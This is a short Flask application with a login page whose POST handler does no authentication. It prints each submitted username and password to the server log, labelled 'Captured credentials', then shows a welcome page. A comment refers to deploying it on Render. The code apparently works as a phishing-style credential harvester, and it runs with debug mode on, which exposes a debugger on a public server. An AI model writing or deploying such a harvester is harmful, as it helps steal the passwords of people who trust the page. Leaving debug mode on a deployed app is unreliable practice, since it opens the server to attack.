from flask import Flask, render_template, request

app = Flask(__name__, template_folder="templates")  # Explicitly specify templates folder

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')  # Use .get() to avoid KeyErrors
        password = request.form.get('password')
        print(f"Captured credentials -> Username: {username}, Password: {password}")  
        return render_template('welcome.html')
    return render_template('login.html')

@app.route('/welcome')
def welcome():
    return render_template('welcome.html')

if __name__ == '__main__':
    app.run(debug=True)  # No need for manual host/port in Render
